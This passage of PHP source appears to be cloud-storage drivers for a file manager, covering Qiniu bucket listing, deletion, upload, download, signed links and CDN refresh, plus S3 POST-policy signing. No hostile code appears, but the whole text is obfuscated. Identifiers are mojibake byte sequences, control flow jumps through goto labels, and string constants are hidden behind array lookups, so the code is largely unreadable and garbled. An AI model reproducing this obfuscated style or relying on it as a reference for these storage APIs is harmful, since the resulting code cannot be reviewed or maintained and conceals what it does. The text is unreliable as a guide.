$D¡´™ó…ŸË); return $CÅÌ¢ø¸” ? !1 : !0; } public function delFolder($e…äÇç—»È) { goto béŠÄë¬’´; dƒ¨öÍèœ¸: if (!empty($e…äÇç—»È) && $e…äÇç—»È !== $D¤’ÕÅ‰‘[191] && !in_array($bù©Æİ¿„œ, $CíôÎÛª¯Å[$D¤’ÕÅ‰‘[75]])) { $CíôÎÛª¯Å[$D¤’ÕÅ‰‘[75]][] = $bù©Æİ¿„œ; } $EÎÍšºé« = $this->delByBatch($CíôÎÛª¯Å[$D¤’ÕÅ‰‘[74]]); if (!$EÎÍšºé«) { return !1; } goto aêÙ‘àéÄ‹; aêÙ‘àéÄ‹: $EÎÍšºé« = $this->delByBatch($CíôÎÛª¯Å[$D¤’ÕÅ‰‘[75]]); if (!$EÎÍšºé«) { return !1; } return $this->delFile($bù©Æİ¿„œ); goto DßÉĞ‡„Çñ; béŠÄë¬’´: $D¤’ÕÅ‰‘ =& $_SERVER[œº]; if (!$this->exist($e…äÇç—»È)) { return !0; } $this->listItemCache = !1; goto Cíî÷³›¦ñ; Cíî÷³›¦ñ: $CíôÎÛª¯Å = $this->fileList($e…äÇç—»È); $this->listItemCache = !0; $bù©Æİ¿„œ = trim($e…äÇç—»È, $D¤’ÕÅ‰‘[8]) . $D¤’ÕÅ‰‘[8]; goto dƒ¨öÍèœ¸; DßÉĞ‡„Çñ: } private function delByBatch($b»àèö¶Ù‹) { foreach (array_chunk($b»àèö¶Ù‹, 1000) as $DÏ—Ÿ¾ˆùÖ) { $c³Š¼—×Ææ = $this->bucketManager->buildBatchDelete($this->bucket, $DÏ—Ÿ¾ˆùÖ); list($dœÂ°­‡Ö, $F±íëë‡Ë–) = $this->bucketManager->batch($c³Š¼—×Ææ); if ($F±íëë‡Ë–) { return !1; } } return !0; } public function rename($E¬ĞœæÜ§è, $FÓÎÃí¹®) { return $this->renameObject($E¬ĞœæÜ§è, $FÓÎÃí¹®); } public function fileInfo($B³©µºƒÍÜ, $f¾²¸èŠ¤¤ = false, $Aí£ŠÑ¦¢É = array()) { goto EĞëŞËêÅ¬; EĞëŞËêÅ¬: $AâïšÂĞ‚ =& $_SERVER[œº]; $AÃ¸¤¢»ºÙ = array($AâïšÂĞ‚[28] => $this->pathThis($B³©µºƒÍÜ), $AâïšÂĞ‚[76] => $this->getPathOuter($AâïšÂĞ‚[8] . $B³©µºƒÍÜ), $AâïšÂĞ‚[29] => $AâïšÂĞ‚[193], $AâïšÂĞ‚[78] => isset($Aí£ŠÑ¦¢É[$AâïšÂĞ‚[1304]]) ? $Aí£ŠÑ¦¢É[$AâïšÂĞ‚[1304]] : 0, $AâïšÂĞ‚[168] => $this->ext($B³©µºƒÍÜ)); if ($f¾²¸èŠ¤¤) { return $AÃ¸¤¢»ºÙ; } goto BÑ£á†¿ïñ; FÌ…ê–¼éÂ: if (isset($Aí£ŠÑ¦¢É[$AâïšÂĞ‚[1305]])) { $AÃ¸¤¢»ºÙ[$AâïšÂĞ‚[84]] = substr($Aí£ŠÑ¦¢É[$AâïšÂĞ‚[1305]] . $AâïšÂĞ‚[33], 0, 10); } if (isset($Aí£ŠÑ¦¢É[$AâïšÂĞ‚[1304]])) { $AÃ¸¤¢»ºÙ[$AâïšÂĞ‚[78]] = $Aí£ŠÑ¦¢É[$AâïšÂĞ‚[1304]]; } return $AÃ¸¤¢»ºÙ; goto c…ó»ˆœÆØ; BÑ£á†¿ïñ: $AÃ¸¤¢»ºÙ[$AâïšÂĞ‚[194]] = $AÃ¸¤¢»ºÙ[$AâïšÂĞ‚[84]] = 0; $AÃ¸¤¢»ºÙ[$AâïšÂĞ‚[195]] = $AÃ¸¤¢»ºÙ[$AâïšÂĞ‚[196]] = !0; if (empty($Aí£ŠÑ¦¢É)) { $Aí£ŠÑ¦¢É = $this->objectMeta($B³©µºƒÍÜ); if (!$Aí£ŠÑ¦¢É) { return $AÃ¸¤¢»ºÙ; } } goto FÌ…ê–¼éÂ; c…ó»ˆœÆØ: } public function folderInfo($B·®ß‘ŒˆÙ, $b„ß ç¦Ê¬ = false) { goto EïÍ—ù„›; b¿¨‘ß—áé: $aœ†®ÆìÁŸ = $this->objectMeta($B·®ß‘ŒˆÙ); if (isset($aœ†®ÆìÁŸ[$eêÏÑµ¾˜[1305]])) { $eËÌì¯¸ÓŠ[$eêÏÑµ¾˜[84]] = substr($aœ†®ÆìÁŸ[$eêÏÑµ¾˜[1305]] . $eêÏÑµ¾˜[33], 0, 10); } return $eËÌì¯¸ÓŠ; goto e«ÏÅÀ¬¶÷; EïÍ—ù„›: $eêÏÑµ¾˜ =& $_SERVER[œº]; $eËÌì¯¸ÓŠ = array($eêÏÑµ¾˜[28] => $this->pathThis($B·®ß‘ŒˆÙ), $eêÏÑµ¾˜[76] => $this->getPathOuter($eêÏÑµ¾˜[8] . $B·®ß‘ŒˆÙ), $eêÏÑµ¾˜[29] => $eêÏÑµ¾˜[77]); if ($b„ß ç¦Ê¬) { return $eËÌì¯¸ÓŠ; } goto Eö“ÁÄ´ó¯; Eö“ÁÄ´ó¯: $eËÌì¯¸ÓŠ[$eêÏÑµ¾˜[194]] = $eËÌì¯¸ÓŠ[$eêÏÑµ¾˜[84]] = 0; $eËÌì¯¸ÓŠ[$eêÏÑµ¾˜[195]] = $eËÌì¯¸ÓŠ[$eêÏÑµ¾˜[196]] = !0; $B·®ß‘ŒˆÙ = rtrim($B·®ß‘ŒˆÙ, $eêÏÑµ¾˜[8]) . $eêÏÑµ¾˜[8]; goto b¿¨‘ß—áé; e«ÏÅÀ¬¶÷: } public function listPath($cí‰›Œ‡İ¼, $d¨ÃŠñğ¾ = false) { $C†ø±–Ù»š =& $_SERVER[œº]; $c¦Æçà­ø» = $this->fileList($cí‰›Œ‡İ¼, $C†ø±–Ù»š[8], !0); foreach ($c¦Æçà­ø»[$C†ø±–Ù»š[75]] as $Cì”øî÷ => $CõÁäÄò®) { $c¦Æçà­ø»[$C†ø±–Ù»š[75]][$Cì”øî÷] = $this->folderInfo($CõÁäÄò®, $d¨ÃŠñğ¾); } foreach ($c¦Æçà­ø»[$C†ø±–Ù»š[74]] as $Cì”øî÷ => $CõÁäÄò®) { $c¦Æçà­ø»[$C†ø±–Ù»š[74]][$Cì”øî÷] = $this->fileInfo($CõÁäÄò®[$C†ø±–Ù»š[93]], $d¨ÃŠñğ¾, $CõÁäÄò®); } return $c¦Æçà­ø»; } public function has($D–‚ø¨…š×, $B°—¬ŸŸí = false, $BªÌĞŒøö‹ = true) { goto cë°ìñÂÊö; cë°ìñÂÊö: $aù¡à®‹ =& $_SERVER[œº]; $D–‚ø¨…š× = trim($D–‚ø¨…š×, $aù¡à®‹[8]); $fí—‘ ƒÉ› = empty($D–‚ø¨…š×) && $D–‚ø¨…š× !== $aù¡à®‹[191] ? $aù¡à®‹[33] : $D–‚ø¨…š× . $aù¡à®‹[8]; goto CÕğ Ìç; a­ õÏ‹Ëí: $Cš¾›«ÛŒ´ = $bŸ¯ë˜­š = 0; while (!0) { check_abort(); list($fÔ¾èÜÖ™, $Eªˆ×Ç¡Ì¿) = $this->bucketManager->listFiles($this->bucket, $fí—‘ ƒÉ›, $dœğ±Şæâ, $FÈ§°ÎÉ, $d¨ºÓôÒ¢è); if ($Eªˆ×Ç¡Ì¿) { break; } $dœğ±Şæâ = array_key_exists($aù¡à®‹[1274], $fÔ¾èÜÖ™) ? $dœğ±Şæâ = $fÔ¾èÜÖ™[$aù¡à®‹[1306]] : $aù¡à®‹[33]; if ($B°—¬ŸŸí) { if (!empty($fÔ¾èÜÖ™[$aù¡à®‹[1307]])) { $Cš¾›«ÛŒ´ += count($fÔ¾èÜÖ™[$aù¡à®‹[1307]]); } if (!empty($fÔ¾èÜÖ™[$aù¡à®‹[1308]])) { $bŸ¯ë˜­š += count($fÔ¾èÜÖ™[$aù¡à®‹[1308]]); } if ($dœğ±Şæâ === $aù¡à®‹[33]) { break; } continue; } if ($BªÌĞŒøö‹) { if (!empty($fÔ¾èÜÖ™[$aù¡à®‹[1307]])) { return !0; } } else { if (!empty($fÔ¾èÜÖ™[$aù¡à®‹[1308]])) { return !0; } } if ($dœğ±Şæâ === $aù¡à®‹[33]) { break; } } if ($B°—¬ŸŸí) { return array($aù¡à®‹[203] => $Cš¾›«ÛŒ´, $aù¡à®‹[204] => $bŸ¯ë˜­š); } goto bÕ÷’â²¼à; CÕğ Ìç: $dœğ±Şæâ = $aù¡à®‹[33]; $FÈ§°ÎÉ = 500; $d¨ºÓôÒ¢è = $aù¡à®‹[8]; goto a­ õÏ‹Ëí; bÕ÷’â²¼à: return !1; goto d©¬µ©‰«ö; d©¬µ©‰«ö: } public function listAll($cÖË”‹è¦Î) { $f°Ú¦©›ö =& $_SERVER[œº]; $AĞØ†ó É³ = $this->fileList($cÖË”‹è¦Î, $f°Ú¦©›ö[33], !0); $cšÃÌôòŒ© = array(); foreach ($AĞØ†ó É³[$f°Ú¦©›ö[74]] as $b‘ŠœöÔŒÉ) { $cšÃÌôòŒ©[$b‘ŠœöÔŒÉ[$f°Ú¦©›ö[93]]] = $b‘ŠœöÔŒÉ[$f°Ú¦©›ö[78]]; } foreach ($AĞØ†ó É³[$f°Ú¦©›ö[75]] as $b‘ŠœöÔŒÉ) { if (is_string($b‘ŠœöÔŒÉ)) { $cšÃÌôòŒ©[$b‘ŠœöÔŒÉ] = 0; } } return $this->listAllFiles($cÖË”‹è¦Î, array_keys($cšÃÌôòŒ©), $cšÃÌôòŒ©); } private function fileList($A‘Æ‡ì‰Œ§, $D™Ä„‘Ë¬Ğ = '', $Fªßİ•œìÍ = 0) { goto fÀà§â¬á¯; Cœä”óÄ©ª: $Aæà¥æ—‰º = $A‰É‡½‘½ = array(); while (!0) { check_abort(); list($c’ßÀÕ”ù”, $eÑÓ‰ßé) = $this->bucketManager->listFiles($this->bucket, $AèÓî¤ÌŸ , $a¶×©ïÄ¦¹, $aÃ¥Áé…Êƒ, $D™Ä„‘Ë¬Ğ); if ($eÑÓ‰ßé) { break; } $a¶×©ïÄ¦¹ = array_key_exists($bÂÖÜµ«øê[1274], $c’ßÀÕ”ù”) ? $a¶×©ïÄ¦¹ = $c’ßÀÕ”ù”[$bÂÖÜµ«øê[1306]] : $bÂÖÜµ«øê[33]; $c—„É–òå = isset($c’ßÀÕ”ù”[$bÂÖÜµ«øê[1307]]) ? $c’ßÀÕ”ù”[$bÂÖÜµ«øê[1307]] : array(); $b†·”¿˜Á = isset($c’ßÀÕ”ù”[$bÂÖÜµ«øê[1308]]) ? $c’ßÀÕ”ù”[$bÂÖÜµ«øê[1308]] : array(); foreach ($c—„É–òå as $d²Ë—­Ãõ†) { goto AÓ¤À’âµ; AÓ¤À’âµ: if ($d²Ë—­Ãõ†[$bÂÖÜµ«øê[93]] == $AèÓî¤ÌŸ ) { continue; } $dè½–ŠšµÄ = $d²Ë—­Ãõ†[$bÂÖÜµ«øê[93]]; $Aµã”Éòà = $d²Ë—­Ãõ†[$bÂÖÜµ«øê[1304]]; goto BÁÛ«ğ“‹Û; BÁÛ«ğ“‹Û: $d²Ë—­Ãõ†[$bÂÖÜµ«øê[78]] = $Aµã”Éòà; $dé×–¤¬¨’ = $Aµã”Éòà == 0 && substr($dè½–ŠšµÄ, strlen($dè½–ŠšµÄ) - 1, 1) == $bÂÖÜµ«øê[8] ? !0 : !1; if ($aÄÀğ×Ó‡‡) { $this->cacheMethod($bÂÖÜµ«øê[199], $dè½–ŠšµÄ, $dé×–¤¬¨’); $this->cacheMethod($bÂÖÜµ«øê[200], $dè½–ŠšµÄ, $d²Ë—­Ãõ†); } goto D˜ß¯ëÖê; D˜ß¯ëÖê: if ($dé×–¤¬¨’) { $Aæà¥æ—‰º[] = $dè½–ŠšµÄ; continue; } $A‰É‡½‘½[] = $Fªßİ•œìÍ ? $d²Ë—­Ãõ† : $dè½–ŠšµÄ; goto AŞïãÇ¤„; AŞïãÇ¤„: } foreach ($b†·”¿˜Á as $dè½–ŠšµÄ) { if ($dè½–ŠšµÄ == $AèÓî¤ÌŸ ) { continue; } $Aæà¥æ—‰º[] = $dè½–ŠšµÄ; if ($aÄÀğ×Ó‡‡) { $this->cacheMethod($bÂÖÜµ«øê[199], $dè½–ŠšµÄ, !0); } } if ($a¶×©ïÄ¦¹ === $bÂÖÜµ«øê[33]) { break; } } if ($aÄÀğ×Ó‡‡) { $this->cacheMethod($bÂÖÜµ«øê[199], $A‘Æ‡ì‰Œ§, !0); } goto E„à…íê‚­; fÀà§â¬á¯: $bÂÖÜµ«øê =& $_SERVER[œº]; $A‘Æ‡ì‰Œ§ = trim($A‘Æ‡ì‰Œ§, $bÂÖÜµ«øê[8]); $AèÓî¤ÌŸ  = empty($A‘Æ‡ì‰Œ§) && $A‘Æ‡ì‰Œ§ !== $bÂÖÜµ«øê[191] ? $bÂÖÜµ«øê[33] : $A‘Æ‡ì‰Œ§ . $bÂÖÜµ«øê[8]; goto A¤ÚŸ®ÅŸÚ; E„à…íê‚­: return array($bÂÖÜµ«øê[75] => $Aæà¥æ—‰º, $bÂÖÜµ«øê[74] => $A‰É‡½‘½); goto DŠ‚Íˆù ; A¤ÚŸ®ÅŸÚ: $a¶×©ïÄ¦¹ = $bÂÖÜµ«øê[33]; $aÃ¥Áé…Êƒ = 1000; $aÄÀğ×Ó‡‡ = $this->listItemCache === !1 ? !1 : !0; goto Cœä”óÄ©ª; DŠ‚Íˆù : } public function canRead($dÜ§ÓÊŒË) { return $this->exist($dÜ§ÓÊŒË) ? !0 : !1; } public function canWrite($DëèõÍ§ä) { return $this->exist($DëèõÍ§ä) ? !0 : !1; } public function getContent($aØªÜ·•§Ë) { return $this->fileSubstr($aØªÜ·•§Ë, 0, -1); } public function setContent($DŠ°œ”‘¸Ğ, $fÌ¥—ÒÚ—¸ = '') { $C¦”¥‘ÈÕç = $this->tempFile($this->pathThis($DŠ°œ”‘¸Ğ)); file_put_contents($C¦”¥‘ÈÕç, $fÌ¥—ÒÚ—¸); if ($this->upload($DŠ°œ”‘¸Ğ, $C¦”¥‘ÈÕç)) { $this->tempFileRemve($C¦”¥‘ÈÕç); return !0; } return !1; } public function refreshUrls($E÷—øÕ…Ñ) { goto B©àé…óª‘; e¤÷ŞÑåõ: return $e·Â…Ş‚[$fŞ§·‚ø‚¾[1078]] == $fŞ§·‚ø‚¾[720] ? !0 : !1; goto A¦­¥Ûöåì; F‚Ä½‚ØÄ·: $c…å”Éì¶º = new Qiniu\Cdn\CdnManager($this->auth); list($e·Â…Ş‚, $e“ùÑÜæÒ) = $c…å”Éì¶º->refreshUrls($F®À–ší„); if ($e“ùÑÜæÒ) { return !1; } goto e¤÷ŞÑåõ; B©àé…óª‘: $fŞ§·‚ø‚¾ =& $_SERVER[œº]; $F®À–ší„ = array(); if (is_array($E÷—øÕ…Ñ)) { foreach ($E÷—øÕ…Ñ as $c‚ÄÛœºÖÕ) { $F®À–ší„[] = $this->link($c‚ÄÛœºÖÕ); } } else { $F®À–ší„[] = $this->link($E÷—øÕ…Ñ); } goto F‚Ä½‚ØÄ·; A¦­¥Ûöåì: } public function fileSubstr($f­ïâµ˜ù, $f¿âè¹‹Ó, $AÊ­ñª‡¦é) { $B²ùŠ¢ÏÂä =& $_SERVER[œº]; if (!($FÆçØ”ÎÍÚ = $this->link($f­ïâµ˜ù))) { return !1; } $AÜÏÃÃ¥¦– = !1; if ($AÊ­ñª‡¦é > 0) { $B·ôöğ° = $f¿âè¹‹Ó + $AÊ­ñª‡¦é - 1; $AÜÏÃÃ¥¦– = array($B²ùŠ¢ÏÂä[1309] . $f¿âè¹‹Ó . $B²ùŠ¢ÏÂä[440] . $B·ôöğ°); } $e¦Ò‹á©Ú = url_request($FÆçØ”ÎÍÚ, $B²ùŠ¢ÏÂä[228], !1, $AÜÏÃÃ¥¦–); return $e¦Ò‹á©Ú[$B²ùŠ¢ÏÂä[710]] ? $e¦Ò‹á©Ú[$B²ùŠ¢ÏÂä[1088]] : !1; } public function upload($CÑÆòÕĞÄ, $c„‘§÷İÛÛ, $c¨ŞÏ ¼ô = false, $dˆÌ–Ãí¾‰ = REPEAT_REPLACE) { $C˜ŸÜ®Ÿ‹ = new Qiniu\Storage\UploadManager(); $Bœ¬ÀÕèÓá = $this->auth->uploadToken($this->bucket, $CÑÆòÕĞÄ); $Bˆ“Ò’©Š = get_file_mime(get_path_ext($c„‘§÷İÛÛ)); list($DŸ–ÈÓØ«ğ, $eƒ®Ò¦äó´) = $C˜ŸÜ®Ÿ‹->putFile($Bœ¬ÀÕèÓá, $CÑÆòÕĞÄ, $c„‘§÷İÛÛ, null, $Bˆ“Ò’©Š); return $eƒ®Ò¦äó´ ? !1 : $this->getPathOuter($CÑÆòÕĞÄ); } public function uploadFormData($b›ˆ£¤£ˆË, $aÚ¥¿Î˜¹Ê = 3600) { return $this->uploadToken($b›ˆ£¤£ˆË, $aÚ¥¿Î˜¹Ê); } public function multiUploadFormData($eñÉ³ä™÷İ, $a‚šßµˆ“ = 3600) { return $this->uploadToken($eñÉ³ä™÷İ, $a‚šßµˆ“); } private function uploadToken($có³¼Ó˜ÔË, $aó”Ööª‘± = 3600) { goto CŒŸˆïø; B Íî•‡‹ò: $eãÙ¬„æØ½ = http_type() . "\72\57\57\165\x70\x6c\157\141\x64{$b¾“³º¨é²}\x2e\161\x69\156\151\165\x70\56\x63\157\x6d\x2f"; return array($EâØ¢‹õê[1313] => $aÀÛÔÜ†£“, $EâØ¢‹õê[1314] => $eãÙ¬„æØ½); goto C©ªğÈ¯; FÉ¬¯áùÙ: $F®â¸ŸëßÆ = $có³¼Ó˜ÔË; $aÀÛÔÜ†£“ = $this->auth->uploadToken($this->bucket, $F®â¸ŸëßÆ, $C‰©Å’ôë•, $AÒÉœ„Ôö÷, !0); $b¾“³º¨é² = empty($this->region) || $this->region == $EâØ¢‹õê[1312] ? $EâØ¢‹õê[33] : $EâØ¢‹õê[440] . $this->region; goto B Íî•‡‹ò; CŒŸˆïø: $EâØ¢‹õê =& $_SERVER[œº]; $C‰©Å’ôë• = $aó”Ööª‘±; $AÒÉœ„Ôö÷ = array($EâØ¢‹õê[1310] => $EâØ¢‹õê[1311]); goto FÉ¬¯áùÙ; C©ªğÈ¯: } public function download($AÈáÒìª™Á, $EÑø–æË§©) { goto eÇ½…Úõ; f£ŞàÍ: $dóïÅ•©è‚ = 1024 * 200; $Bï„™¹†Á = fopen($aÉÑ¥„æö, $_SERVER[œº][1315]); while (!0) { $E—œ‡àœˆ = $this->fileSubstr($AÈáÒìª™Á, $dí±Ø¤Ÿƒ, $dóïÅ•©è‚); if ($E—œ‡àœˆ === !1) { return !1; } fwrite($Bï„™¹†Á, $E—œ‡àœˆ); $dí±Ø¤Ÿƒ += $dóïÅ•©è‚; if (strlen($E—œ‡àœˆ) < $dóïÅ•©è‚) { break; } } goto AéæäâÔ¯´; eÇ½…Úõ: $aÉÑ¥„æö = IO::getPathInner(IO::mkfile($EÑø–æË§©)); if (!($d¢†áÍ”¦ò = $this->link($AÈáÒìª™Á))) { return !1; } $dí±Ø¤Ÿƒ = 0; goto f£ŞàÍ; AéæäâÔ¯´: fclose($Bï„™¹†Á); return $EÑø–æË§©; goto eó˜‹ÃåÒƒ; eó˜‹ÃåÒƒ: } public function link($d¸ò¾ÓÙÇæ, $CÔ†İŒÖ”¬ = '') { if (!$this->isFile($d¸ò¾ÓÙÇæ)) { return !1; } $BÔ¹óóØãß = $this->getHost() . $_SERVER[œº][8] . $this->pathEncode($d¸ò¾ÓÙÇæ) . $CÔ†İŒÖ”¬; return $this->auth->privateDownloadUrl($BÔ¹óóØãß, 3600 * 12); } public function fileOut($AÑŸÀ¸Á¦¾, $b“’°øÅ¨ = false, $FØ©ïÆÙù¤ = false, $D¥¥õ´½¸ê = '') { $C¼ó«ğ©† =& $_SERVER[œº]; if ($this->isFileOutServer()) { return $this->fileOutServer($AÑŸÀ¸Á¦¾, $b“’°øÅ¨, $FØ©ïÆÙù¤, $D¥¥õ´½¸ê); } if (!$FØ©ïÆÙù¤) { $FØ©ïÆÙù¤ = $this->pathThis($AÑŸÀ¸Á¦¾); } $C×Õ‘¾•Ãõ = $b“’°øÅ¨ ? $C¼ó«ğ©†[1316] . rawurlencode($FØ©ïÆÙù¤) : $C¼ó«ğ©†[33]; $dÛ‡ÖÕé ˜ = $this->link($AÑŸÀ¸Á¦¾, $C×Õ‘¾•Ãõ); $this->fileOutLink($dÛ‡ÖÕé ˜); } public function fileOutServer($BÛŞä§ãöª, $AæÆŸÆ’ê½ = false, $aÏ‘Î²öÓ = false, $Cšàäö = '') { parent::fileOut($BÛŞä§ãöª, $AæÆŸÆ’ê½, $aÏ‘Î²öÓ, $Cšàäö); } public function fileOutImage($BºÇáÒ„…‡, $DÒ³å¤Í´ˆ = 250) { $CøÙîÑ¿– = $this->link($BºÇáÒ„…‡, $_SERVER[œº][1317] . $DÒ³å¤Í´ˆ); $this->fileOutLink($CøÙîÑ¿–); } public function fileOutImageServer($aÆĞ¬Ã‚­, $F«Åø»¶×Ø = 250) { parent::fileOutImage($aÆĞ¬Ã‚­, $F«Åø»¶×Ø); } public function hashMd5($C¶ù†—ò¿°) { $B™³ÀçÔÛÂ =& $_SERVER[œº]; $FíéšÕæÅ = $this->objectMeta($C¶ù†—ò¿°); return isset($FíéšÕæÅ[$B™³ÀçÔÛÂ[208]]) ? $FíéšÕæÅ[$B™³ÀçÔÛÂ[208]] : !1; $cÌæ“´ÊãŸ = $this->link($C¶ù†—ò¿°, $B™³ÀçÔÛÂ[1318]); } public function size($C…Ø¨º“¾) { $fœí©¹…²ò = $this->objectMeta($C…Ø¨º“¾); return $fœí©¹…²ò ? $fœí©¹…²ò[$_SERVER[œº][78]] : 0; } public function info($DÕ“ˆ †¬£) { if ($this->isFolder($DÕ“ˆ †¬£)) { return $this->folderInfo($DÕ“ˆ †¬£); } else { if ($this->isFile($DÕ“ˆ †¬£)) { return $this->fileInfo($DÕ“ˆ †¬£); } } return !1; } public function exist($E‚ÔäÒ‡£») { return $this->isFile($E‚ÔäÒ‡£») || $this->isFolder($E‚ÔäÒ‡£»); } public function isFile($FùÈØ…ã¬) { return !$this->isFolder($FùÈØ…ã¬) && $this->objectMeta($FùÈØ…ã¬); } public function isFolder($cØˆñí±Í) { return $this->cacheMethod($_SERVER[œº][199], $cØˆñí±Í); } protected function objectMeta($Fà–ÊîÛ) { return $this->cacheMethod($_SERVER[œº][200], $Fà–ÊîÛ); } protected function _objectMeta($f‘‡’™£áë) { $Dª×ÎÁ¨‘ =& $_SERVER[œº]; list($fÀ•¼æØÎ¯, $Eğ‚™Ñ¸Áñ) = $this->bucketManager->stat($this->bucket, $f‘‡’™£áë); if ($fÀ•¼æØÎ¯) { $fÀ•¼æØÎ¯[$Dª×ÎÁ¨‘[78]] = intval($fÀ•¼æØÎ¯[$Dª×ÎÁ¨‘[1304]]); } return $fÀ•¼æØÎ¯; } protected function _isFolder($fÔ×¸¡„ÅÆ) { $Ešù˜¯Ó†® =& $_SERVER[œº]; if ($fÔ×¸¡„ÅÆ == $Ešù˜¯Ó†®[33] || $fÔ×¸¡„ÅÆ == $Ešù˜¯Ó†®[8]) { return !0; } list($cÌ™‹Ï¥Ğˆ, $F‰Ü´ô‘ö) = $this->bucketManager->listFiles($this->bucket, trim($fÔ×¸¡„ÅÆ, $Ešù˜¯Ó†®[8]) . $Ešù˜¯Ó†®[8], $Ešù˜¯Ó†®[33], 1, $Ešù˜¯Ó†®[8]); return !empty($cÌ™‹Ï¥Ğˆ[$Ešù˜¯Ó†®[1307]]) || !empty($cÌ™‹Ï¥Ğˆ[$Ešù˜¯Ó†®[1308]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($D Ë‹º±²Ê) { parent::__construct($D Ë‹º±²Ê); } public function uploadFormData($Fƒùôá—°ƒ, $e‚”‚ï²Ğ = 3600) { goto B—‰ØØÍ; fìåğ£Ó‰‰: $eÈöË¬ˆï© = array($E“ËÖ„£Â[211] => $E“ËÖ„£Â[33], $E“ËÖ„£Â[1236] => $E“ËÖ„£Â[33], $E“ËÖ„£Â[1193] => $bË®Îó‘Å, $E“ËÖ„£Â[1197] => $CĞ’Í›ä«, $E“ËÖ„£Â[1201] => $BóÄÜ¿Ë´, $E“ËÖ„£Â[1237] => $aòª£ÀŠ×¿, $E“ËÖ„£Â[1238] => $d×Ú¤™ÔÂŸ, $E“ËÖ„£Â[1239] => $AÑ—ô‰‹¨Ó, $E“ËÖ„£Â[1240] => $F®¡ˆäùÔ, $E“ËÖ„£Â[1241] => $DØàãÎºÅ›, $E“ËÖ„£Â[175] => $this->getHost()); return $eÈöË¬ˆï©; goto f„šÔÂ±ñ„; b»ïôŠ˜: $d¢”éğÑòÒ = array($this->accessKey, $aÍ…·ğãØÄ, $this->region, $fë¶ß°‹Ø¸, $cˆƒ³ÈÒŞÈ); $aòª£ÀŠ×¿ = implode($E“ËÖ„£Â[8], $d¢”éğÑòÒ); $AÄÆÚñ¥ÓÛ = array($E“ËÖ„£Â[1191] => gmdate($E“ËÖ„£Â[1190], strtotime($E“ËÖ„£Â[1227])), $E“ËÖ„£Â[1192] => array(array($E“ËÖ„£Â[1194] => $this->bucket), array($E“ËÖ„£Â[1193] => $bË®Îó‘Å), array($E“ËÖ„£Â[1195], $E“ËÖ„£Â[1196], $E“ËÖ„£Â[33]), array($E“ËÖ„£Â[1195], $E“ËÖ„£Â[1228], $E“ËÖ„£Â[33]), array($E“ËÖ„£Â[1195], $E“ËÖ„£Â[1229], $E“ËÖ„£Â[33]), array($E“ËÖ„£Â[1197] => $CĞ’Í›ä«), array($E“ËÖ„£Â[1230] => $aòª£ÀŠ×¿), array($E“ËÖ„£Â[1231] => $d×Ú¤™ÔÂŸ), array($E“ËÖ„£Â[1232] => $AÑ—ô‰‹¨Ó), array($E“ËÖ„£Â[1233] => $F®¡ˆäùÔ))); goto BïçÏŸÚ¨; DÅ‘‚ÅÓÎ: $e­¡¼·™Œ½ = hash_hmac($E“ËÖ„£Â[1234], $fë¶ß°‹Ø¸, $CƒŞÚÔ„ªÚ, !0); $f²”ã©†£… = hash_hmac($E“ËÖ„£Â[1234], $cˆƒ³ÈÒŞÈ, $e­¡¼·™Œ½, !0); $DØàãÎºÅ› = hash_hmac($E“ËÖ„£Â[1234], $BóÄÜ¿Ë´, $f²”ã©†£…); goto fìåğ£Ó‰‰; B—‰ØØÍ: $E“ËÖ„£Â =& $_SERVER[œº]; $bË®Îó‘Å = $E“ËÖ„£Â[192]; $d×Ú¤™ÔÂŸ = $E“ËÖ„£Â[1224]; goto EÌ¨Í²¨Ï; c° Ëùœ‹İ: $cˆƒ³ÈÒŞÈ = $E“ËÖ„£Â[1226]; $F®¡ˆäùÔ = $e‚”‚ï²Ğ . $E“ËÖ„£Â[33]; $CĞ’Í›ä« = $E“ËÖ„£Â[1189]; goto b»ïôŠ˜; BïçÏŸÚ¨: $BóÄÜ¿Ë´ = base64_encode(json_encode($AÄÆÚñ¥ÓÛ)); $BöóÉ–òãÜ = hash_hmac($E“ËÖ„£Â[1234], $aÍ…·ğãØÄ, $E“ËÖ„£Â[1235] . $this->secret, !0); $CƒŞÚÔ„ªÚ = hash_hmac($E“ËÖ„£Â[1234], $this->region, $BöóÉ–òãÜ, !0); goto DÅ‘‚ÅÓÎ; EÌ¨Í²¨Ï: $fë¶ß°‹Ø¸ = $E“ËÖ„£Â[59]; $AÑ—ô‰‹¨Ó = gmdate($E“ËÖ„£Â[1225]); $aÍ…·ğãØÄ = gmdate($E“ËÖ„£Â[711]); goto c° Ëùœ‹İ; f„šÔÂ±ñ„: } public function multiUploadFormData($F™†›¤Åİ, $BœòÂÜå = 3600) { $c¥òÉšªŞÏ =& $_SERVER[œº]; $a»çÔ§šª¸ = gmdate($c¥òÉšªŞÏ[1319]); $C¤Æ¦ºÂÏ§ = array(); $c¾¯äó¾Æ = $this->client->getUploadId($this->bucket, $F™†›¤Åİ, $C¤Æ¦ºÂÏ§); if (!$c¾¯äó¾Æ) { return !1; } return array($c¥òÉšªŞÏ[221] => $c¾¯äó¾Æ, $c¥òÉšªŞÏ[175] => $this->getHost() . $c¥òÉšªŞÏ[8] . $this->pathEncode($F™†›¤Åİ), $c¥òÉšªŞÏ[222] => $a»çÔ§šª¸, $c¥òÉšªŞÏ[93] => $F™†›¤Åİ); } public function multiUploadAuthData($fˆÜ©Î¶£, $c»ëô”à† = array()) { goto cñğÓ÷Ù»; cñğÓ÷Ù»: $fñ¹–Ú¢Ï =& $_SERVER[œº]; $fù´ô¡‰îŠ = isset($c»ëô”à†[$fñ¹–Ú¢Ï[168]]) ? $c»ëô”à†[$fñ¹–Ú¢Ï[168]] : $fñ¹–Ú¢Ï[33]; $BßÒ¹„‰‘ë = $c»ëô”à†[$fñ¹–Ú¢Ï[93]]; goto b‹Ùáº‡¡Á; d•â¦ÀÃÛ‘: if (isset($c»ëô”à†[$fñ¹–Ú¢Ï[1320]])) { $a¤Ú·´ùÖ¼[$fñ¹–Ú¢Ï[1321]] = $c»ëô”à†[$fñ¹–Ú¢Ï[1320]]; } $F¶Œ…áŠ¼Ò = explode($fñ¹–Ú¢Ï[177], $this->getHost()); $F¿·’ÆÓ— = array($fñ¹–Ú¢Ï[1322] => $F¶Œ…áŠ¼Ò[1], $fñ¹–Ú¢Ï[1323] => $fñ¹–Ú¢Ï[33], $fñ¹–Ú¢Ï[211] => $fñ¹–Ú¢Ï[119], $fñ¹–Ú¢Ï[1236] => $c»ëô”à†[$fñ¹–Ú¢Ï[78]]); goto b·¾ÓÕõŸ±; Bõ²½¯ëÉ¹: if (strpos($fù´ô¡‰îŠ, $fñ¹–Ú¢Ï[225]) === 0) 